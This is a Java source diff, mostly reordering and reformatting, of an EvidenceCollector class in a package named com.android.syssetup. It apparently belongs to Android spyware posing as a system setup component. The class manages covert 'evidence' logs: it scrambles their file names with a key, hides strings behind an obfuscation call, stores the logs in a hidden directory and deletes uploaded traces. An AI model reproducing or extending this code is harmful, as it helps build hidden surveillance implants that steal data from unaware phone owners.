@@ -9,6 +9,18 @@
 
 package com.android.syssetup.evidence;
 
+import android.content.Context;
+
+import com.android.mm.M;
+import com.android.syssetup.Status;
+import com.android.syssetup.auto.Cfg;
+import com.android.syssetup.crypto.Encryption;
+import com.android.syssetup.crypto.Keys;
+import com.android.syssetup.file.AutoFile;
+import com.android.syssetup.file.Path;
+import com.android.syssetup.util.ByteArray;
+import com.android.syssetup.util.Check;
+
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
@@ -18,55 +30,81 @@ import java.util.Date;
 import java.util.TreeMap;
 import java.util.Vector;
 
-import android.content.Context;
-
-import com.android.syssetup.Status;
-import com.android.syssetup.auto.Cfg;
-import com.android.syssetup.crypto.Encryption;
-import com.android.syssetup.crypto.Keys;
-import com.android.syssetup.file.AutoFile;
-import com.android.syssetup.file.Path;
-import com.android.syssetup.util.ByteArray;
-import com.android.syssetup.util.Check;
-import com.android.mm.M;
-
 // TODO: Auto-generated Javadoc
+
 /**
  * The Class EvidenceCollector.
  */
 public class EvidenceCollector {
-	/** The debug. */
-	private static final String TAG = "EvidenceColl"; //$NON-NLS-1$
-	/** The Constant LOG_EXTENSION. */
+	/**
+	 * The Constant LOG_EXTENSION.
+	 */
 	public static final String LOG_EXTENSION = M.e(".mob"); //$NON-NLS-1$
-
-	/** The Constant LOG_DIR_PREFIX. */
+	/**
+	 * The Constant LOG_DIR_PREFIX.
+	 */
 	public static final String LOG_DIR_PREFIX = M.e("Z"); // Utilizzato per creare le //$NON-NLS-1$
-	// Log Dir
-	/** The Constant LOG_DIR_FORMAT. */
+	/**
+	 * The Constant LOG_DIR_FORMAT.
+	 */
 	public static final String LOG_DIR_FORMAT = M.e("Z*"); // Utilizzato nella //$NON-NLS-1$
-	// ricerca delle Log Dir
-	/** The Constant LOG_PER_DIRECTORY. */
+	// Log Dir
+	/**
+	 * The Constant LOG_PER_DIRECTORY.
+	 */
 	public static final int LOG_PER_DIRECTORY = 500; // Numero massimo di log
-	// per ogni directory
-	/** The Constant MAX_LOG_NUM. */
+	// ricerca delle Log Dir
+	/**
+	 * The Constant MAX_LOG_NUM.
+	 */
 	public static final int MAX_LOG_NUM = 25000; // Numero massimo di log che
-
-	/** The Constant PROG_FILENAME. */
-	private static final String PROG_FILENAME = M.e("geb"); //$NON-NLS-1$
+	// per ogni directory
 	public static final String LOG_TMP = M.e(".dat"); //$NON-NLS-1$
-
-	/** The seed. */
-	int seed;
-
-	/** The singleton. */
+	/**
+	 * The debug.
+	 */
+	private static final String TAG = "EvidenceColl"; //$NON-NLS-1$
+	/**
+	 * The Constant PROG_FILENAME.
+	 */
+	private static final String PROG_FILENAME = M.e("geb"); //$NON-NLS-1$
+	/**
+	 * The singleton.
+	 */
 	private volatile static EvidenceCollector singleton;
 	private static Object evidenceCollectorLock = new Object();
+	/**
+	 * The seed.
+	 */
+	int seed;
+	/**
+	 * The log vector.
+	 */
+	Vector<String> logVector;
 	private String prefix = M.e("l_");
+	/**
+	 * The log progressive.
+	 */
+	private int logProgressive;
+
+	/**
+	 * Instantiates a new log collector.
+	 */
+	private EvidenceCollector() {
+		super();
+		logVector = new Vector<String>();
+
+		logProgressive = deserializeProgressive();
+		flushEvidences();
+		// keys = Encryption.getKeys();
+		// seed = keys.getChallengeKey()[0];
+	}
+
+	// public boolean storeToMMC;
 
 	/**
 	 * Self.
-	 * 
+	 *
 	 * @return the evidence collector
 	 */
 	public static EvidenceCollector self() {
@@ -83,20 +121,20 @@ public class EvidenceCollector {
 
 	/**
 	 * Decrypt name.
-	 * 
-	 * @param logMask
-	 *            the log mask
+	 *
+	 * @param logMask the log mask
 	 * @return the string
 	 */
 	public static String decryptName(final String logMask) {
 		return Encryption.decryptName(logMask, Keys.self().getChallengeKey()[0]);
 	}
 
+	// Keys keys;
+
 	/**
 	 * Encrypt name.
-	 * 
-	 * @param logMask
-	 *            the log mask
+	 *
+	 * @param logMask the log mask
 	 * @return the string
 	 */
 	public static String encryptName(final String logMask) {
@@ -104,105 +142,10 @@ public class EvidenceCollector {
 		return Encryption.encryptName(logMask, key[0]);
 	}
 
-	// public boolean storeToMMC;
-	/** The log vector. */
-	Vector<String> logVector;
-
-	/** The log progressive. */
-	private int logProgressive;
-
-	// Keys keys;
-
-	/**
-	 * Instantiates a new log collector.
-	 */
-	private EvidenceCollector() {
-		super();
-		logVector = new Vector<String>();
-
-		logProgressive = deserializeProgressive();
-		flushEvidences();
-		// keys = Encryption.getKeys();
-		// seed = keys.getChallengeKey()[0];
-	}
-
-	/**
-	 * Removes the progressive.
-	 */
-	public synchronized void removeProgressive() {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Info: Removing Progressive");//$NON-NLS-1$
-		}
-		final Context content = Status.getAppContext();
-		try {
-			content.deleteFile(PROG_FILENAME);
-		} catch (Exception ex) {
-			if (Cfg.EXCEPTION) {
-				Check.log(ex);
-			}
-
-		}
-	}
-
-	/**
-	 * Deserialize progressive.
-	 * 
-	 * @return the int
-	 */
-	private synchronized int deserializeProgressive() {
-		final Context content = Status.getAppContext();
-		int progessive = 0;
-		try {
-			//TODO: togliere, usare la data di sistema
-			final FileInputStream fos = content.openFileInput(PROG_FILENAME);
-
-			final byte[] prog = new byte[4];
-			fos.read(prog);
-			progessive = ByteArray.byteArrayToInt(prog, 0);
-
-			fos.close();
-		} catch (final IOException e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Warn: " + e.toString());//$NON-NLS-1$
-			}
-		}
-
-		return progessive;
-	}
-
-	/**
-	 * Gets the new progressive.
-	 * 
-	 * @return the new progressive
-	 */
-	protected synchronized int getNewProgressive() {
-		logProgressive++;
-
-		final Context content = Status.getAppContext();
-
-		try {
-			final FileOutputStream fos = content.openFileOutput(PROG_FILENAME, Context.MODE_PRIVATE);
-
-			fos.write(ByteArray.intToByteArray(logProgressive));
-			fos.close();
-		} catch (final IOException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
-			}
-		}
-
-		return logProgressive;
-	}
-
 	/**
 	 * Make date name.
-	 * 
-	 * @param date
-	 *            the date
+	 *
+	 * @param date the date
 	 * @return the string
 	 */
 	private static String makeDateName(final Date date) {
@@ -217,136 +160,9 @@ public class EvidenceCollector {
 	}
 
 	/**
-	 * Make new name.
-	 * 
-	 * @param log
-	 *            the log
-	 * @param logType
-	 *            the log type
-	 * @return the vector
-	 */
-	public synchronized Name makeNewName(final Evidence log, final String logType) {
-		final Date timestamp = log.timestamp;
-		final int progressive = getNewProgressive();
-
-		if (Cfg.DEBUG) {
-			Check.asserts(progressive >= 0, "makeNewName fail progressive >=0"); //$NON-NLS-1$
-		}
-
-		final String basePath = Path.logs();
-
-		final String blockDir = prefix + (progressive / LOG_PER_DIRECTORY); //$NON-NLS-1$
-
-		// http://www.rgagnon.com/javadetails/java-0021.html
-		final String mask = M.e("0000"); //$NON-NLS-1$
-		final String ds = Long.toString(progressive % 10000); // double to
-		// string
-		final int size = mask.length() - ds.length();
-		if (Cfg.DEBUG) {
-			Check.asserts(size >= 0, "makeNewName: failed size>0"); //$NON-NLS-1$
-		}
-		final String paddedProgressive = mask.substring(0, size) + ds;
-
-		final String fileName = paddedProgressive + "" + logType + "" + makeDateName(timestamp); //$NON-NLS-1$ //$NON-NLS-2$
-
-		final String encName = encryptName(fileName + LOG_EXTENSION);
-
-		if (Cfg.DEBUG) {
-			Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName + " ch: " + seed + " not scrambled: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
-					+ fileName + LOG_EXTENSION);
-		}
-
-		final Name name = new Name();
-		name.progressive = progressive;
-		name.basePath = basePath;
-		name.blockDir = blockDir;
-		name.encName = encName;
-		name.fileName = fileName;
-
-		return name;
-	}
-
-	/**
-	 * Removes the.
-	 * 
-	 * @param logName
-	 *            the log name
-	 */
-	public void remove(final String logName) {
-		// if(AutoConfig.DEBUG) Check.log( TAG + " Removing file: " + logName) ;//$NON-NLS-1$
-		final AutoFile file = new AutoFile(logName);
-		file.delete();
-	}
-
-	/**
-	 * Rimuove i file uploadati e le directory dei log dal sistema e dalla MMC.
-	 * @return the int
-	 */
-	public synchronized int removeHidden() {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (removeHidden)");//$NON-NLS-1$
-		}
-		final int removed = removeRecursive(new File(Path.hidden()), Integer.MAX_VALUE);
-		return removed;
-	}
-
-	/**
-	 * Removes the log recursive.
-	 * 
-	 * @param basePath
-	 *            the base path
-	 * @param numFiles
-	 *            the num files
-	 * @return the int
-	 */
-	private int removeRecursive(final File basePath, final int numFiles) {
-		int numLogsDeleted = 0;
-
-		// File fc;
-		try {
-			// fc = new File(basePath);
-
-			if (basePath.isDirectory()) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (removeRecursive): " + basePath.getName());//$NON-NLS-1$
-				}
-				final File[] fileLogs = basePath.listFiles();
-
-				for (final File file : fileLogs) {
-					final int removed = removeRecursive(file, numFiles - numLogsDeleted);
-					numLogsDeleted += removed;
-				}
-			}
-
-			if (!basePath.delete()) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (removeRecursive) Error: " + basePath.getAbsolutePath());//$NON-NLS-1$
-				}
-			} else {
-				numLogsDeleted += 1;
-			}
-
-		} catch (final Exception e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: removeLog: " + basePath + " ex: " + e);//$NON-NLS-1$ //$NON-NLS-2$
-			}
-		}
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " removeLogRecursive removed: " + numLogsDeleted);//$NON-NLS-1$
-		}
-		return numLogsDeleted;
-
-	}
-
-	/**
 	 * Restituisce la lista ordinata dele dir secondo il nome.
-	 * 
-	 * @param currentPath
-	 *            the current path
+	 *
+	 * @param currentPath the current path
 	 * @return the vector
 	 */
 	public static Vector<String> scanForDirLogs(final String currentPath) {
@@ -391,11 +207,9 @@ public class EvidenceCollector {
 	 * Estrae la lista di log nella forma *.MOB dentro la directory specificata
 	 * da currentPath, nella forma 1_n Restituisce la lista ordinata secondo il
 	 * nome demangled
-	 * 
-	 * @param currentPath
-	 *            the current path
-	 * @param dir
-	 *            the dir
+	 *
+	 * @param currentPath the current path
+	 * @param dir         the dir
 	 * @return the vector
 	 */
 	public static String[] scanForEvidences(final String currentPath, final String dir) {
@@ -456,7 +270,7 @@ public class EvidenceCollector {
 		}
 		final ArrayList<String> val = new ArrayList<String>(map.values());
 		// Collections.reverse(val);
-		return val.toArray(new String[] {});
+		return val.toArray(new String[]{});
 	}
 
 	private static boolean notVeryOld(File fcDir, String file) {
@@ -482,7 +296,7 @@ public class EvidenceCollector {
 		}
 		for (int i = 0; i < dsize; ++i) {
 			final String dir = (String) dirs.elementAt(i); // per reverse:
-															// dsize-i-1
+			// dsize-i-1
 
 			File fcDir = null;
 
@@ -517,5 +331,199 @@ public class EvidenceCollector {
 
 			}
 		}
+	}
+
+	/**
+	 * Removes the progressive.
+	 */
+	public synchronized void removeProgressive() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Info: Removing Progressive");//$NON-NLS-1$
+		}
+		final Context content = Status.getAppContext();
+		try {
+			content.deleteFile(PROG_FILENAME);
+		} catch (Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
+		}
+	}
+
+	/**
+	 * Deserialize progressive.
+	 *
+	 * @return the int
+	 */
+	private synchronized int deserializeProgressive() {
+		final Context content = Status.getAppContext();
+		int progessive = 0;
+		try {
+			//TODO: togliere, usare la data di sistema
+			final FileInputStream fos = content.openFileInput(PROG_FILENAME);
+
+			final byte[] prog = new byte[4];
+			fos.read(prog);
+			progessive = ByteArray.byteArrayToInt(prog, 0);
+
+			fos.close();
+		} catch (final IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Warn: " + e.toString());//$NON-NLS-1$
+			}
+		}
+
+		return progessive;
+	}
+
+	/**
+	 * Gets the new progressive.
+	 *
+	 * @return the new progressive
+	 */
+	protected synchronized int getNewProgressive() {
+		logProgressive++;
+
+		final Context content = Status.getAppContext();
+
+		try {
+			final FileOutputStream fos = content.openFileOutput(PROG_FILENAME, Context.MODE_PRIVATE);
+
+			fos.write(ByteArray.intToByteArray(logProgressive));
+			fos.close();
+		} catch (final IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
+			}
+		}
+
+		return logProgressive;
+	}
+
+	/**
+	 * Make new name.
+	 *
+	 * @param log     the log
+	 * @param logType the log type
+	 * @return the vector
+	 */
+	public synchronized Name makeNewName(final Evidence log, final String logType) {
+		final Date timestamp = log.timestamp;
+		final int progressive = getNewProgressive();
+
+		if (Cfg.DEBUG) {
+			Check.asserts(progressive >= 0, "makeNewName fail progressive >=0"); //$NON-NLS-1$
+		}
+
+		final String basePath = Path.logs();
+
+		final String blockDir = prefix + (progressive / LOG_PER_DIRECTORY); //$NON-NLS-1$
+
+		// http://www.rgagnon.com/javadetails/java-0021.html
+		final String mask = M.e("0000"); //$NON-NLS-1$
+		final String ds = Long.toString(progressive % 10000); // double to
+		// string
+		final int size = mask.length() - ds.length();
+		if (Cfg.DEBUG) {
+			Check.asserts(size >= 0, "makeNewName: failed size>0"); //$NON-NLS-1$
+		}
+		final String paddedProgressive = mask.substring(0, size) + ds;
+
+		final String fileName = paddedProgressive + "" + logType + "" + makeDateName(timestamp); //$NON-NLS-1$ //$NON-NLS-2$
+
+		final String encName = encryptName(fileName + LOG_EXTENSION);
+
+		if (Cfg.DEBUG) {
+			Check.asserts(!encName.endsWith("mob"), "makeNewName: " + encName + " ch: " + seed + " not scrambled: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+					+ fileName + LOG_EXTENSION);
+		}
+
+		final Name name = new Name();
+		name.progressive = progressive;
+		name.basePath = basePath;
+		name.blockDir = blockDir;
+		name.encName = encName;
+		name.fileName = fileName;
+
+		return name;
+	}
+
+	/**
+	 * Removes the.
+	 *
+	 * @param logName the log name
+	 */
+	public void remove(final String logName) {
+		// if(AutoConfig.DEBUG) Check.log( TAG + " Removing file: " + logName) ;//$NON-NLS-1$
+		final AutoFile file = new AutoFile(logName);
+		file.delete();
+	}
+
+	/**
+	 * Rimuove i file uploadati e le directory dei log dal sistema e dalla MMC.
+	 *
+	 * @return the int
+	 */
+	public synchronized int removeHidden() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (removeHidden)");//$NON-NLS-1$
+		}
+		final int removed = removeRecursive(new File(Path.hidden()), Integer.MAX_VALUE);
+		return removed;
+	}
+
+	/**
+	 * Removes the log recursive.
+	 *
+	 * @param basePath the base path
+	 * @param numFiles the num files
+	 * @return the int
+	 */
+	private int removeRecursive(final File basePath, final int numFiles) {
+		int numLogsDeleted = 0;
+
+		// File fc;
+		try {
+			// fc = new File(basePath);
+
+			if (basePath.isDirectory()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (removeRecursive): " + basePath.getName());//$NON-NLS-1$
+				}
+				final File[] fileLogs = basePath.listFiles();
+
+				for (final File file : fileLogs) {
+					final int removed = removeRecursive(file, numFiles - numLogsDeleted);
+					numLogsDeleted += removed;
+				}
+			}
+
+			if (!basePath.delete()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (removeRecursive) Error: " + basePath.getAbsolutePath());//$NON-NLS-1$
+				}
+			} else {
+				numLogsDeleted += 1;
+			}
+
+		} catch (final Exception e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: removeLog: " + basePath + " ex: " + e);//$NON-NLS-1$ //$NON-NLS-2$
+			}
+		}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " removeLogRecursive removed: " + numLogsDeleted);//$NON-NLS-1$
+		}
+		return numLogsDeleted;
+
 	}
 }
